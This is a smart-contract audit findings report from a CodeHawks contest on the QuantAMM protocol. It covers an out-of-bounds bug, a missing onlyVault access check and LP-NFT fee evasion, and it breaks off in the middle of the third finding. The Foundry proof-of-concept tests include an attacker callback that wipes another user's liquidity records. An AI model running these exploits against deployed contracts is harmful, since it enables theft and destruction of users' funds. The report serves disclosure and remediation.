# QuantAMM - Findings Report

# Table of contents
- ### [Contest Summary](#contest-summary)
- ### [Results Summary](#results-summary)
- ## High Risk Findings
    - [H-01. Out-of-Bounds Array Access in `_calculateQuantAMMVariance` with Odd Number of Assets and Vector Lambda](#H-01)
    - [H-02. Critical: Malicious user can delete all Users Deposited Liquidity.](#H-02)
    - [H-03. Fee Evasion via LP Token Transfer Resets Deposit Value](#H-03)
    - [H-04. Denial of service when calculating the new weights if the rule requires previous moving averages](#H-04)
    - [H-05. Loss of Fees for Router `UpliftOnlyExample` due to Division Rounding in Admin Fee Calculation, Causing Unfair Fee Distribution](#H-05)
    - **[H-06. Owner fee will be locked in `UpliftOnlyExample` contract due to incorrect recipient address in `UpliftOnlyExample::onAfterSwap`](#H-06) [REPORTED]**
    - [H-07. Missing Fee Normalization Leads to 1e18x Fee Overcharge in UpliftOnlyExample](#H-07)
    - **[H-08. GradientBasedRules will not work for >=4 assets with vector lambdas](#H-08) [REPORTED]**
    - [H-09.  Locked Protocol Fees Due to Incorrect Fee Collection Method](#H-09)
    - [H-10. Donations are sanwichable to steal funds from LP](#H-10)
    - [H-11. Users transferring their NFT position will retroactively get the new `upliftFeeBps`](#H-11)
    - [H-12. fees sent to QuantAMMAdmin is stuck forever as there is no function to retrieve them](#H-12)
    - [H-13. Incorrect uplift fee calculation leads to LPs incurring more fees than expected](#H-13)
- ## Medium Risk Findings
    - [M-01. quantAMMSwapFeeTake used for both getQuantAMMSwapFeeTake and getQuantAMMUpliftFeeTake.](#M-01)
    - [M-02. `setUpdateWeightRunnerAddress` could break the protocol ](#M-02)
    - [M-03. “Uplift Fee” Incorrectly Falls Back to Minimum Fee Due to Integer Division](#M-03)
    - [M-04. The user will lost his liquidity if he transfers the LP NFT to himself](#M-04)
    - [M-05. formula Deviation from White Paper and Weighted Pool `performUpdate` unintended revert](#M-05)
    - [M-06. Slight miscalculation in maxAmountsIn for Admin Fee Logic in UpliftOnlyExample::onAfterRemoveLiquidity Causes Lock of All Funds](#M-06)
    - [M-07. Transferring deposit NFT doesn't check if the receiver exceeds the 100 deposit limit](#M-07)
    - [M-08. The `computeBalance` function may revert because the `setWeights` function doesn't check the boundary of the normalized weight ](#M-08)
    - [M-09. The `maxTradeSizeRatio` can be bypassed due to incorrect logic in `onSwap` function](#M-09)
    - [M-10. Users are charged too much `exitFee` in `UpliftOnlyExample::onAfterRemoveLiquidity` function when `localData.lpTokenDepositValueChange > 0` and can cause underflow error if `lpTokenDepositValueChange` increase too much.](#M-10)
    - [M-11. If main oracle is removed from approved list it will keep returning not stale but invalid data (0 value)](#M-11)
    - [M-12. Getting data from pool can be reverted when one of the oracle is not live](#M-12)
    - [M-13. Protocol Fees Diminished Due to Admin Fee Payment on Liquidity Removal](#M-13)
    - [M-14. Incorrect implementation of QuantammMathGuard.sol#_clampWeights.](#M-14)
    - [M-15. Wrong Fee Take Function Called in UpliftOnlyExample Causing Incorrect Fee Distribution](#M-15)
    - [M-16. Liquidity Removal Reverts in `onAfterRemoveLiquidity` Callback Triggered by `removeLiquidityProportional`](#M-16)
    - [M-17. Stale Weights Due to Improper Weight Normalization and Guard Rail Violation](#M-17)
    - [M-18. incorrect length check in `_setIntermediateVariance` will DOS manual setting of `intermediateVarianceStates` after pool initialization](#M-18)
- ## Low Risk Findings
    - [L-01. Inconsistent timestamp storage when the LPNFT is transferred.](#L-01)
    - [L-02. Critical Precision Loss in MultiHopOracle Price Calculations](#L-02)
    - [L-03. Using front-run or a reorg attack it is possible steal higher value deposits from the sender by shifting NFT ID](#L-03)
    - [L-04. Incorrect event emitted in `setUpdateWeightRunnerAddress()` function](#L-04)
    - [L-05. Inconsistent event data in `WeightsUpdated` emissions](#L-05)
    - [L-06. Fee Bypass Through Precision Loss in Low-Decimal Tokens](#L-06)
    - [L-07. `minWithdrawalFeeBps` are not added to `upliftFeeBps` causing loss of fees and allowing MEV actions](#L-07)
    - [L-08. The `QuantammCovarianceBasedRule::_calculateQuantAMMCovariance` returns a two dimensional array with a wrong dimension](#L-08)
    - [L-09. Incorrect event emission can be done as a griefing attack](#L-09)
    - [L-10. Potential Mismatch Between `setWeightsManually` and `setWeights` Functionality](#L-10)
    - [L-11. `_clampWeights` does not consider values equal to `absoluteMin` and `absoluteMax`](#L-11)
    - [L-12. incorrect length check in `_setIntermediateCovariance` will DOS manual setting of `intermediateCovarianceStates` after pool initialization](#L-12)


# <a id='contest-summary'></a>Contest Summary

### Sponsor: QuantAMM

### Dates: Dec 20th, 2024 - Jan 15th, 2025

[See more contest details here](https://codehawks.cyfrin.io/c/2024-12-quantamm)

# <a id='results-summary'></a>Results Summary

### Number of findings:
   - High: 13
   - Medium: 18
   - Low: 12


# High Risk Findings

## <a id='H-01'></a>H-01. Out-of-Bounds Array Access in `_calculateQuantAMMVariance` with Odd Number of Assets and Vector Lambda

_Submitted by [undefined](https://profiles.cyfrin.io/u/undefined). Selected submission by: [undefined](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary

The `_calculateQuantAMMVariance` function in the `QuantAMMVarianceBasedRule` contract contains a critical vulnerability that leads to an out-of-bounds array access error when the following conditions are met: 1) the number of assets in the pool is odd, and 2) a vector of lambda values is used (i.e., `_poolParameters.lambda.length > 1`). This error occurs because the loop index `locals.nMinusOne` is not correctly decremented before the main loop when these conditions are satisfied. The vulnerability results in a denial-of-service (DoS) for a core functionality of the protocol: updating pool weights based on the Minimum Variance rule. The bug also makes the weight calculation fail with normal data when the above two conditions are satisfied, which will also impact the normal usage of this function.

## Vulnerability Details

The vulnerability resides in the `_calculateQuantAMMVariance` function of the `QuantAMMVarianceBasedRule` contract ([`QuantammVarianceBasedRule.sol#L174`](https://github.com/Cyfrin/2024-12-quantamm/blob/a775db4273eb36e7b4536c5b60207c9f17541b92/pkg/pool-quantamm/contracts/rules/base/QuantammVarianceBasedRule.sol#L174)), specifically in how the loop termination condition and array indices are handled when the number of assets is odd and a vector `lambda` is used.

The function has two main code paths: one for when `_poolParameters.lambda.length == 1` (scalar lambda) and another for when `_poolParameters.lambda.length > 1` (vector lambda). Within each path, there's a conditional check for `locals.notDivisibleByTwo`, indicating an odd number of assets.

**In the scalar lambda case**:

1. `locals.nMinusOne` is decremented before the main loop, within the `if (locals.notDivisibleByTwo)` block ([`QuantammVarianceBasedRule.sol#L74`](https://github.com/Cyfrin/2024-12-quantamm/blob/a775db4273eb36e7b4536c5b60207c9f17541b92/pkg/pool-quantamm/contracts/rules/base/QuantammVarianceBasedRule.sol#L74)).

2. `locals.nMinusOne` is incremented after the loop, within the `if (locals.notDivisibleByTwo)` block ([`QuantammVarianceBasedRule.sol#L116`](https://github.com/Cyfrin/2024-12-quantamm/blob/a775db4273eb36e7b4536c5b60207c9f17541b92/pkg/pool-quantamm/contracts/rules/base/QuantammVarianceBasedRule.sol#L116)).

**In the vector lambda case**:

1. `locals.nMinusOne` is **not** decremented before the main loop ([`QuantammVarianceBasedRule.sol#L130`](https://github.com/Cyfrin/2024-12-quantamm/blob/a775db4273eb36e7b4536c5b60207c9f17541b92/pkg/pool-quantamm/contracts/rules/base/QuantammVarianceBasedRule.sol#L130)).

2. `locals.nMinusOne` is incremented after the loop, within the `if (locals.notDivisibleByTwo)` block ([`QuantammVarianceBasedRule.sol#L174`](https://github.com/Cyfrin/2024-12-quantamm/blob/a775db4273eb36e7b4536c5b60207c9f17541b92/pkg/pool-quantamm/contracts/rules/base/QuantammVarianceBasedRule.sol#L174)).

```solidity
    function _calculateQuantAMMVariance(
        int256[] memory _newData,
        QuantAMMPoolParameters memory _poolParameters
    ) internal returns (int256[] memory) {
        QuantAMMVarianceLocals memory locals;
@>      locals.n = _poolParameters.numberOfAssets;
@>      locals.finalState = new int256[](locals.n);
@>      locals.intermediateVarianceState = _quantAMMUnpack128Array(
            intermediateVarianceStates[_poolParameters.pool],
@>          locals.n
        );
@>      locals.nMinusOne = locals.n - 1;
@>      locals.notDivisibleByTwo = locals.n % 2 != 0;
        locals.convertedLambda = int256(_poolParameters.lambda[0]);
        locals.oneMinusLambda = ONE - locals.convertedLambda;

        if (_poolParameters.lambda.length == 1) {
            if (locals.notDivisibleByTwo) {
                unchecked {
@>                  --locals.nMinusOne;
                }
            }

            for (uint i; i < locals.nMinusOne; ) {
				// update states ...

                unchecked {
                    i += 2;
                    ++locals.storageIndex;
                }
            }

            if (locals.notDivisibleByTwo) {
                unchecked {
@>                  ++locals.nMinusOne;
                }
								
				// update states ...
            }
        } else {
            for (uint i; i < locals.nMinusOne; ) {
				// update states ...

                unchecked {
                    i += 2;
                    ++locals.storageIndex;
                }
            }

            if (locals.notDivisibleByTwo) {
                unchecked {
@>                  ++locals.nMinusOne;
@>                  locals.convertedLambda = int256(_poolParameters.lambda[locals.nMinusOne]);
@>                  locals.oneMinusLambda = ONE - locals.convertedLambda;
                }
                locals.intermediateState =
@>                  locals.convertedLambda.mul(locals.intermediateVarianceState[locals.nMinusOne]) +
@>                  (_newData[locals.nMinusOne] - _poolParameters.movingAverage[locals.n + locals.nMinusOne])
@>                      .mul(_newData[locals.nMinusOne] - _poolParameters.movingAverage[locals.nMinusOne])
                        .div(TENPOWEIGHTEEN); 


@>              locals.intermediateVarianceState[locals.nMinusOne] = locals.intermediateState;
@>              locals.finalState[locals.nMinusOne] = locals.oneMinusLambda.mul(locals.intermediateState);
@>              intermediateVarianceStates[_poolParameters.pool][locals.storageIndex] = locals
@>                  .intermediateVarianceState[locals.nMinusOne];
            }
        }

        return locals.finalState;
    }
```

This discrepancy leads to the **"Out-of-Bounds Access"** issue when `_poolParameters.lambda.length > 1` and the number of assets is odd: after the loop, when `locals.notDivisibleByTwo` is true, `locals.nMinusOne` is incremented, making it equal to the number of assets. Subsequent array accesses using this index (e.g., `_poolParameters.lambda[locals.nMinusOne]`, `_newData[locals.nMinusOne]`, `_poolParameters.movingAverage[locals.n + locals.nMinusOne]`, `locals.intermediateVarianceState[locals.nMinusOne]`) will be out-of-bounds, as array indices are zero-based.

This issue causes the function to revert whenever the pool has an odd number of assets and uses a vector lambda, effectively breaking the minimum variance update rule under these conditions. The normal data that will cause this revert and the core functionality of updating weights will be disabled.

## Impact

The vulnerability has a **critical** impact on the functionality of QuantAMM pools that utilize the minimum variance update rule with an odd number of assets and a vector lambda configuration. Specifically, it leads to the following:

1. **Denial of Service:** The `_calculateQuantAMMVariance` function, which is crucial for calculating new weights based on the minimum variance rule, will consistently revert due to the out-of-bounds array access. This effectively prevents the pool from updating its weights, rendering the minimum variance strategy unusable under these conditions.
2. **Broken Core Functionality:** Weight updates are a core component of the QuantAMM protocol. The inability to update weights based on the minimum variance rule disrupts the intended behavior of the pool and prevents it from adapting to market conditions as designed.
3. **Loss of LP Value:** As a strategy pool, the QuantAMM pool is designed to rebalance the pool weights automatically to generate higher LP performance than standard CFMM pools, if the core strategy is broken, the LP value can no longer be guaranteed.

The provided Proof of Concept (PoC) test code, `testVarianceOddAssetsAndVectorLambdaExpectRevert` in `QuantAMMVarianceTest`, successfully demonstrates this vulnerability:

**NOTE**

**please manually modify the test code** before run the test, as to:

* initialize `int256[] memory priceData` with length `numAssets`
* initialize `int256[] memory movingAverage` with length `numAssets * 2`
* initialize `int256[] memory initialVariance` with length `numAssets`
* initialize `int128[] memory lambda` with length `numAssets`

since **platform system will automatically overwrite these array length to empty** when save the upload.

```solidity
contract QuantAMMVarianceTest is Test, QuantAMMTestUtils {
    // other test functions ... 

    // PoC test function
    function testVarianceOddAssetsAndVectorLambdaExpectRevert() public {
        // Initialize test data as to:
        // 1. _poolParameters.lambda.length > 1
        // 2. _poolParameters.numberOfAssets % 2 != 0
        // (refer to the function `_calculateQuantAMMVariance` of the contract `QuantAMMVarianceBasedRule`)
        uint256 numAssets = 5;
        mockPool.setNumberOfAssets(numAssets);

        int256[] memory priceData = new int256[]();
        int256[] memory movingAverage = new int256[]();
        int256[] memory initialVariance = new int256[]();
        int128[] memory lambda = new int128[]();
        for (uint256 i = 0; i < numAssets; i++) {
            priceData[i] = PRBMathSD59x18.fromInt(1000);
            movingAverage[i] = PRBMathSD59x18.fromInt(1000);
            movingAverage[i + numAssets] = PRBMathSD59x18.fromInt(1000);
            initialVariance[i] = 0;
            lambda[i] = int128(uint128(0.5e18));
        }

        mockCalculationRule.setInitialVariance(address(mockPool), initialVariance, numAssets);
        mockCalculationRule.setPrevMovingAverage(movingAverage);

        // Call mock contract to test `QuantAMMVarianceBasedRule._calculateQuantAMMVariance`
        // Odd assets and vector lambda should revert with the array out-of-bounds error
        // Traces info will be included in the submission report
        vm.expectRevert();
        mockCalculationRule.externalCalculateQuantAMMVariance(
            priceData, movingAverage, address(mockPool), lambda, numAssets
        );
    }
}
```

* The test sets up the conditions for the vulnerability: an odd number of assets (`numAssets = 5`) and a vector lambda with length equal to the number of assets.

* It then calls the vulnerable function `externalCalculateQuantAMMVariance` (which internally calls `_calculateQuantAMMVariance`) and asserts that the call will revert using `vm.expectRevert()`.

The PoC test is executed with the specified command:

```bash
forge test --mc QuantAMMVarianceTest --mt testVarianceOddAssetsAndVectorLambdaExpectRevert -vvvv
```

The PoC test result confirms the expected revert with a `panic: array out-of-bounds access (0x32)` error, validating the presence of the vulnerability:

```bash
Ran 1 test for test/foundry/rules/base/Variance.t.sol:QuantAMMVarianceTest
[PASS] testVarianceOddAssetsAndVectorLambdaExpectRevert() (gas: 344214)
Traces:
  [344214] QuantAMMVarianceTest::testVarianceOddAssetsAndVectorLambdaExpectRevert()
    ├─ [22355] MockPool::setNumberOfAssets(5)
    │   └─ ← [Stop] 
    ├─ [32608] MockCalculationRule::setInitialVariance(MockPool: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], [0, 0, 0, 0, 0], 5)
    │   └─ ← [Stop] 
    ├─ [245471] MockCalculationRule::setPrevMovingAverage([1000000000000000000000 [1e21], 1000000000000000000000 [1e21], 1000000000000000000000 [1e21], 1000000000000000000000 [1e21], 1000000000000000000000 [1e21], 1000000000000000000000 [1e21], 1000000000000000000000 [1e21], 1000000000000000000000 [1e21], 1000000000000000000000 [1e21], 1000000000000000000000 [1e21]])
    │   └─ ← [Stop] 
    ├─ [0] VM::expectRevert(custom error 0xf4844814)
    │   └─ ← [Return] 
    ├─ [21199] MockCalculationRule::externalCalculateQuantAMMVariance([1000000000000000000000 [1e21], 1000000000000000000000 [1e21], 1000000000000000000000 [1e21], 1000000000000000000000 [1e21], 1000000000000000000000 [1e21]], [1000000000000000000000 [1e21], 1000000000000000000000 [1e21], 1000000000000000000000 [1e21], 1000000000000000000000 [1e21], 1000000000000000000000 [1e21], 1000000000000000000000 [1e21], 1000000000000000000000 [1e21], 1000000000000000000000 [1e21], 1000000000000000000000 [1e21], 1000000000000000000000 [1e21]], MockPool: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], [500000000000000000 [5e17], 500000000000000000 [5e17], 500000000000000000 [5e17], 500000000000000000 [5e17], 500000000000000000 [5e17]], 5)
    │   └─ ← [Revert] panic: array out-of-bounds access (0x32)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 9.05ms (2.26ms CPU time)

Ran 1 test suite in 134.35ms (9.05ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

The inability to update weights based on the minimum variance rule under these conditions constitutes a high-severity issue as it breaks core protocol functionality and potentially impacts the intended behavior and performance of QuantAMM pools.

## Tools Used

Manual Review

## Recommendations

The core issue stems from the inconsistent handling of the `locals.nMinusOne` variable when dealing with an odd number of assets and a vector lambda. To resolve this, the following code change should be implemented:

**Correctly Decrement `locals.nMinusOne` for Vector Lambda:**

Inside the `_calculateQuantAMMVariance` function, within the `else` block (where `_poolParameters.lambda.length > 1`), add the following code snippet **before** the main loop, similar to how it is done in the scalar lambda (`_poolParameters.lambda.length == 1`) branch:

```diff
        if (_poolParameters.lambda.length == 1) {
		    // update states ...
        } else {
+           if (locals.notDivisibleByTwo) {
+               unchecked {
+                   --locals.nMinusOne;
+               }
+           }        
        
            for (uint i; i < locals.nMinusOne; ) {
				// update states ...

                unchecked {
                    i += 2;
                    ++locals.storageIndex;
                }
            }

            if (locals.notDivisibleByTwo) {
                unchecked {
                    ++locals.nMinusOne;
                    locals.convertedLambda = int256(_poolParameters.lambda[locals.nMinusOne]);
                    locals.oneMinusLambda = ONE - locals.convertedLambda;
                }
								
				// update states ...
            }
        }
```

This change ensures that `locals.nMinusOne` is correctly decremented when the number of assets is odd, aligning the loop termination condition and index calculations with the intended logic. By doing so, the loop will iterate the correct number of times, and the subsequent accesses to array elements using `locals.nMinusOne` will remain within bounds.

This single modification effectively addresses the root cause of the out-of-bounds access and ensures the proper functioning of the minimum variance update rule when using a vector lambda with an odd number of assets.

## <a id='H-02'></a>H-02. Critical: Malicious user can delete all Users Deposited Liquidity.

_Submitted by [undefined](https://profiles.cyfrin.io/u/undefined). Selected submission by: [undefined](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary

The [`onAfterRemoveLiquidity`](https://github.com/Cyfrin/2024-12-quantamm/blob/main/pkg/pool-hooks/contracts/hooks-quantamm/UpliftOnlyExample.sol#L431-L570) function in the `UpliftOnlyExample.sol` implementation does not include the `onlyVault` modifier, this allows any one to invoke the function under **very specific conditions**, an attacker can exploit this flaw to delete the FeeData array and remove users' bptAmount and tokenId.\
This would leave users with a zero balance of BPT, rendering them unable to restore their liquidity.

***

## Vulnerability Details

The `onAfterRemoveLiquidity` function is designed to be invoked exclusively by the Vault, the absence of the `onlyVault` modifier creates a vulnerability where any one can call this function.

`onAfterRemoveLiquidity` is critical function that is called from Vault after router calls [`unlock`](https://github.com/Cyfrin/2024-12-quantamm/blob/main/pkg/vault/contracts/Vault.sol#L133-L135) function in Vault and then the Vault passes the parameters like `bytes memory userData` which is the address of the user who wants to remove liquidity.

But since the `onAfterRemoveLiquidity` has no **onlyVault** and the **unlock** function in Vault must be unlocked the attacker can call it directly from his contract.

**Attack Visualization**:

\[Attacker Contract] --> \[Vault::unlock] --> (Callback) --> \[Attacker Contract] --> \[onAfterRemoveLiquidity]

**Path of the Attack**:

1. **Attacker Prepares the Exploit**:
   * The attacker deploys a malicious contract with two functions:
     * **`callVaultUnlock`**: A function to invoke `Vault.sol::unlock`.
     * **`attackerUnlockCallback`**: A function designed to be called by the Vault during its callback process.

2. **Attacker Initiates the Exploit**:
   * The attacker invokes `Vault.sol::unlock` via their malicious contract using the `callVaultUnlock` function.

3. **Vault Executes Callback**:
   * The `Vault.sol::unlock` function completes part of its process and then executes a callback to the attacker's contract, invoking the `attackerUnlockCallback` function.

4. **Attacker Executes the Exploit**:
   * During the callback phase, the attacker's contract maliciously invokes the `onAfterRemoveLiquidity` function in `UpliftOnlyExample.sol`.

5. **Impact**:
   * As a result of the exploit:
     * **Bob's Balancer Pool Tokens (BPT)** or NFTs are all deleted.
     * Bob is left with **zero balance**, and his liquidity becomes irrecoverable.

PoC: Add this into <https://github.com/Cyfrin/2024-12-quantamm/blob/main/pkg/pool-hooks/test/foundry/UpliftExample.t.sol>

run: forge test --mt test\_Delete\_All\_User\_BPTs\_Share -vvv

```solidity
    uint256 bptAmountDeposit = 10_000e18;
    function test_Delete_All_User_BPTs_Share() public {
        uint256[] memory maxAmountsIn = [dai.balanceOf(bob), usdc.balanceOf(bob)].toMemoryArray();
        uint256[] memory minAmountsOut = [uint256(0), uint256(0)].toMemoryArray();

        LPNFT lpNft = upliftOnlyRouter.lpNFT();

        // Bob add liquidity 10_000e18 * 5
        vm.startPrank(bob);
            for(uint256 i; i < 5; i++) {
                upliftOnlyRouter.addLiquidityProportional(pool, maxAmountsIn, bptAmountDeposit, false, bytes(""));
                skip(1 days); 
            }
        vm.stopPrank();

        // check bob has deposited 5 times.
        UpliftOnlyExample.FeeData[] memory bobFeeData_BeforeAttack = upliftOnlyRouter.getUserPoolFeeData(pool, bob);
        require(bobFeeData_BeforeAttack.length == 5); 

        // This is attacker contract.
        bytes memory data = abi.encodeWithSignature("unlock(bytes)", abi.encodeWithSignature("attackerUnlockCallBack()"));
        (bool ok,) = address(vault).call(data); 
        require(ok, "CallBack Failed!"); 

        // Check that attacker deleted all Bob's FeeData array.
        UpliftOnlyExample.FeeData[] memory bobFeeData_AfterAttack = upliftOnlyRouter.getUserPoolFeeData(pool, bob);
        require(bobFeeData_AfterAttack.length == 0); 

        // check that removing liquidity will revert.
        vm.startPrank(bob);
            vm.expectRevert(
                abi.encodeWithSelector(UpliftOnlyExample.WithdrawalByNonOwner.selector, bob, pool, bptAmountDeposit)
            );

            upliftOnlyRouter.removeLiquidityProportional(bptAmountDeposit, minAmountsOut, false, pool);
        vm.stopPrank();
    }

    // This is call back function to be called from Vault::unlock. 
    function attackerUnlockCallBack() public {
        uint256[] memory minAmountsOut = [uint256(0), uint256(0)].toMemoryArray();

        // attacker calls onAfterRemoveLiquidity directly.
        // and passes Bob's address as target.
        upliftOnlyRouter.onAfterRemoveLiquidity(
            address(upliftOnlyRouter),
            pool,
            RemoveLiquidityKind.PROPORTIONAL,
            // * 5 because bob deposited bptAmountDeposit 5 times.
            bptAmountDeposit * 5,
            minAmountsOut,
            minAmountsOut,
            minAmountsOut,
            // Attacker passes Bob's address.
            abi.encodePacked(bob) 

        );
    } 
```

***

## Impact

This vulnerability can lead to the following:

* Malicious actors can call the function, simulating Vault behavior, and delete all users FeeData array which contains all information about BPT amount and tokenID.
* Users loss their liquidity for ever.

***

## Recommendations

1. Implement the `onlyVault` Modifier Update the `onAfterRemoveLiquidity` function to include the `onlyVault` modifier:

```solidity
   function onAfterRemoveLiquidity(
       address router,
       address pool,
       RemoveLiquidityKind kind,
       uint256 bptAmountIn,
       uint256[] memory userBalances,
       uint256[] memory amountsOutRaw,
       uint256[] memory amountsOutFinal,
       bytes memory userData
   ) public override onlyVault returns(bool, uint256[] memory hookAdjustedAmountsOutRaw) {
       //...
   }
```

## <a id='H-03'></a>H-03. Fee Evasion via LP Token Transfer Resets Deposit Value

_Submitted by [undefined](https://profiles.cyfrin.io/u/undefined). Selected submission by: [undefined](https://profiles.cyfrin.io/u/undefined)._      
            


## 01. Relevant GitHub Links

&#x20;

* <https://github.com/Cyfrin/2024-12-quantamm/blob/a775db4273eb36e7b4536c5b60207c9f17541b92/pkg/pool-hooks/contracts/hooks-quantamm/UpliftOnlyExample.sol#L609C1-L615C1>

## 02. Summary

Within the UpliftOnlyExample contract, liquidity providers receive LP NFTs to represent their share in the pool. However, this LP NFT can be freely transferred to another address. When such a transfer occurs, the contract resets `feeDataArray[tokenIdIndex].lpTokenDepositValue` to the current pool value (i.e., it updates to lpTokenDepositValueNow).

Because the liquidity-removal fee in this protocol depends on the increase (uplift) in the pool’s value since the time of deposit, a higher lpTokenDepositValue means a higher total value is used to calculate fees. By resetting lpTokenDepositValue to the current value via an NFT transfer, users can effectively reduce or bypass paying the additional uplift-related fee when they subsequently withdraw liquidity.

This behavior undermines one of the protocol’s core mechanisms, which is supposed to charge additional fees based on any increase in the value of the liquidity token (“uplift”) from the original deposit time. As a result, attackers can circumvent the intended fee logic and withdraw liquidity with a significantly lower fee than designed.

## 03. Vulnerability Details

The issue stems from the afterUpdate function that runs post-transfer of the LP NFT. This function resets lpTokenDepositValue (and blockTimestampDeposit) to the current time and pool value, effectively discarding the original deposit history. Consequently, the fee calculation logic, which relies on the difference between the original deposit value and the current value, is subverted.

```Solidity
feeDataArray[tokenIdIndex].lpTokenDepositValue = lpTokenDepositValueNow;
feeDataArray[tokenIdIndex].blockTimestampDeposit = uint32(block.number);
feeDataArray[tokenIdIndex].upliftFeeBps = upliftFeeBps;

//actual transfer not a afterTokenTransfer caused by a burn
poolsFeeData[poolAddress][_to].push(feeDataArray[tokenIdIndex]);

```

Because the deposit value is updated at each transfer, this makes the subsequent withdraw operation treat the liquidity as if it were deposited at the new price rather than the original (lower) price.

By transferring the LP NFT to a fresh address (or another account controlled by the same user), the user can reset the reference deposit price to the current (higher) price, eliminating any “gains” that would have triggered a fee. This effectively allows them to pay only the minimal withdrawal fee instead of the intended uplift fee.

## 04. Impact

* Financial Loss to Protocol

The protocol’s revenue mechanism is compromised because users can avoid paying the intended uplift fees. Over time, this can result in significant losses to the protocol, as it no longer collects fair compensation for the increase in token value.

* Undermines Core Protocol Logic

The main feature of controlling Impermanent Loss and charging fees on liquidity growth is effectively negated. This can lead to an unbalanced economic model, where malicious actors gain extra profit at the expense of honest users and the protocol itself.

## 05. Proof of Concept

Below is a test scenario demonstrating how transferring the LP NFT can reduce or bypass the uplift fee:

```Solidity
function test_poc_transfer_RemoveLiquidity_make_low_fee() public {
    uint256 snapshotId = vm.snapshot();
    
    // Test remove Liquidity with no transfer
    // Add Liquidity
    uint256[] memory maxAmountsIn = [dai.balanceOf(bob), usdc.balanceOf(bob)].toMemoryArray();
    vm.prank(bob);
    upliftOnlyRouter.addLiquidityProportional(pool, maxAmountsIn, bptAmount, false, bytes(""));
    vm.stopPrank();

    // setMockPrices
    int256[] memory prices = new int256[]();
    for (uint256 i = 0; i < tokens.length; ++i) {
        prices[i] = int256(i) * 10e18; // 10x
    }
    updateWeightRunner.setMockPrices(pool, prices);

    uint256[] memory minAmountsOut = [uint256(0), uint256(0)].toMemoryArray();

    BaseVaultTest.Balances memory balancesBefore = getBalances(bob);

    // Remove Liquidity
    vm.startPrank(bob);
    upliftOnlyRouter.removeLiquidityProportional(bptAmount, minAmountsOut, false, pool);
    vm.stopPrank();
    BaseVaultTest.Balances memory balancesAfter = getBalances(bob);

    console.log("Bob's DAI amountOut: ", balancesAfter.bobTokens[daiIdx] - balancesBefore.bobTokens[daiIdx]);
    console.log("Bob's USDC amountOut: ", balancesAfter.bobTokens[usdcIdx] - balancesBefore.bobTokens[usdcIdx]);

    vm.revertTo(snapshotId);

    // Add Liquidity
    maxAmountsIn = [dai.balanceOf(bob), usdc.balanceOf(bob)].toMemoryArray();
    vm.prank(bob);
    upliftOnlyRouter.addLiquidityProportional(pool, maxAmountsIn, bptAmount, false, bytes(""));
    vm.stopPrank();

    // setMockPrices
    prices = new int256[](tokens.length);
    for (uint256 i = 0; i < tokens.length; ++i) {
        prices[i] = int256(i) * 10e18; // 10x
    }
    updateWeightRunner.setMockPrices(pool, prices);

    minAmountsOut = [uint256(0), uint256(0)].toMemoryArray();

    balancesBefore = getBalances(alice);

    // transfer to alice
    uint256 expectedTokenId = 1;

    LPNFT lpNft = upliftOnlyRouter.lpNFT();

    vm.prank(bob);
    lpNft.transferFrom(bob, alice, expectedTokenId);

    // Alice Remove Liquidity
    vm.startPrank(alice);
    upliftOnlyRouter.removeLiquidityProportional(bptAmount, minAmountsOut, false, pool);
    vm.stopPrank();
    balancesAfter = getBalances(alice);

    console.log("After transfer Alice's DAI amountOut: ", balancesAfter.aliceTokens[daiIdx] - balancesBefore.aliceTokens[daiIdx]);
    console.log("After transfer Alice's USDC amountOut: ", balancesAfter.aliceTokens[usdcIdx] - balancesBefore.aliceTokens[usdcIdx]);

}

```

Running this test (`forge test --mt test_transfer_RemoveLiquidity_fee -vv`) shows that the liquidity withdrawn by Alice (who received the NFT via transfer) is higher than Bob’s direct withdrawal, indicating lower fees were applied.

```diff
bshyuunn@hyuunn-MacBook-Air pool-hooks % forge test --mt test_transfer_RemoveLiquidity_fee -vv
[⠰] Compiling...
[⠒] Compiling 1 files with Solc 0.8.26
[⠰] Solc 0.8.26 finished in 116.66s
Compiler run successful with warnings:

Warning: the following cheatcode(s) are deprecated and will be removed in future versions:
  snapshot(): replaced by `snapshotState`
  revertTo(uint256): replaced by `revertToState`
Ran 1 test for test/foundry/UpliftExample.t.sol:UpliftOnlyExampleTest
[PASS] test_transfer_RemoveLiquidity_fee() (gas: 1608352)
Logs:
  Bob's DAI amountOut:  820000000000000000000
  Bob's USDC amountOut:  820000000000000000000
  After transfer Alice's DAI amountOut:  999500000000000000000
  After transfer Alice's USDC amountOut:  999500000000000000000

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 76.97ms (13.28ms CPU time)

Ran 1 test suite in 439.49ms (76.97ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)

```

## 06. Tools Used

Manual Code Review and Foundry

## 07. Recommended Mitigation

A straightforward approach to allow LP NFT transfers without undermining fee calculations is to retain the original deposit data (including lpTokenDepositValue) even after the NFT is transferred.

```Solidity
    function afterUpdate(address _from, address _to, uint256 _tokenID) public {
        if (msg.sender != address(lpNFT)) {
            revert TransferUpdateNonNft(_from, _to, msg.sender, _tokenID);
        }

        address poolAddress = nftPool[_tokenID];

        if (poolAddress == address(0)) {
            revert TransferUpdateTokenIDInvaid(_from, _to, _tokenID);
        }

        int256[] memory prices = IUpdateWeightRunner(_updateWeightRunner).getData(poolAddress);
-       uint256 lpTokenDepositValueNow = getPoolLPTokenValue(prices, poolAddress, MULDIRECTION.MULDOWN);

        FeeData[] storage feeDataArray = poolsFeeData[poolAddress][_from];

        uint256 feeDataArrayLength = feeDataArray.length;
        uint256 tokenIdIndex;
        bool tokenIdIndexFound = false;

        //find the tokenID index in the array
        for (uint256 i; i < feeDataArrayLength; ++i) {
            if (feeDataArray[i].tokenID == _tokenID) {
                tokenIdIndex = i;
                tokenIdIndexFound = true;
                break;
            }
        }

        if (tokenIdIndexFound) {
            if (_to != address(0)) {
                // Update the deposit value to the current value of the pool in base currency (e.g. USD) and the block index to the current block number
                //vault.transferLPTokens(_from, _to, feeDataArray[i].amount);
-               feeDataArray[tokenIdIndex].lpTokenDepositValue = lpTokenDepositValueNow;
-               feeDataArray[tokenIdIndex].blockTimestampDeposit = uint32(block.number);
-               feeDataArray[tokenIdIndex].upliftFeeBps = upliftFeeBps;

                //actual transfer not a afterTokenTransfer caused by a burn
